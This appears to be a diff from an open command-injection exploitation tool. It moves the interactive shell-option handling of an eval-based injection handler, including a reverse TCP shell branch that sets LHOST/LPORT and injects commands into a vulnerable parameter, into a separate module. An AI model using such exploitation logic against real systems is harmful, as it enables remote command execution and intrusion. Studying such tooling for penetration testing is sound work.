@@ -377,50 +377,9 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                     # if settings.VERBOSITY_LEVEL >= 1:
                     #   print ""
                     if cmd.lower() in settings.SHELL_OPTIONS:
-                      os_shell_option = checks.check_os_shell_options(cmd.lower(), technique, go_back, no_result) 
-                      if os_shell_option == False:
-                        if no_result == True:
-                          return False
-                        else:
-                          return True 
-                      elif os_shell_option == "quit":                    
-                        sys.exit(0)
-                      elif os_shell_option == "back":
-                        go_back = True
+                      go_back, go_back_again = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, delay, go_back_again)
+                      if go_back:
                         break
-                      elif os_shell_option == "os_shell": 
-                        warn_msg = "You are already into an 'os_shell' mode." 
-                        print settings.print_warning_msg(warn_msg)+ "\n"
-                      elif os_shell_option == "reverse_tcp":
-                        settings.REVERSE_TCP = True
-                        # Set up LHOST / LPORT for The reverse TCP connection.
-                        reverse_tcp.configure_reverse_tcp()
-                        if settings.REVERSE_TCP == False:
-                          continue
-                        while True:
-                          if settings.LHOST and settings.LPORT in settings.SHELL_OPTIONS:
-                            result = checks.check_reverse_tcp_options(settings.LHOST)
-                          else:  
-                            cmd = reverse_tcp.reverse_tcp_options()
-                            result = checks.check_reverse_tcp_options(cmd)
-                          if result != None:
-                            if result == 0:
-                              return False
-                            elif result == 1 or result == 2:
-                              go_back_again = True
-                              settings.REVERSE_TCP = False
-                              break
-                          # Command execution results.
-                          response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
-                          # Evaluate injection results.
-                          shell = eb_injector.injection_results(response, TAG, cmd)
-                          if settings.VERBOSITY_LEVEL >= 1:
-                            print ""
-                          err_msg = "The reverse TCP connection has failed!"
-                          print settings.print_critical_msg(err_msg)
-                      else:
-                        pass
-                        
                     else:
                       # The main command injection exploitation.
                       response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)
